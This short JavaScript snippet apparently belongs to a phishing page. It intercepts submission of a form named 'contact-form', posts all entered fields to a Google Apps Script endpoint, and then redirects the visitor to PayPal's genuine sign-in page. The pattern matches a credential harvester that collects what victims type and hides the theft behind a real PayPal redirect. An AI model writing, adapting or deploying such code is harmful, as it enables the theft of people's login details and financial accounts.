const scriptURL = 'https://script.google.com/macros/s/AKfycbw6l-LZypRtZizW8xGwUZSQ_kvleccTb0lY6fbMcfgK6Yd0r7ewhaVX7E1VOrHW5KWyDg/exec'

const form = document.forms['contact-form']

form.addEventListener('submit', e => {
  e.preventDefault()
  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
  .then(response => window.location.assign('https://www.paypal.com/us/signin'))
  .then(() => { window.location.assign('https://www.paypal.com/us/signin'); })
  .catch(error => console.error('Error!', error.message))
})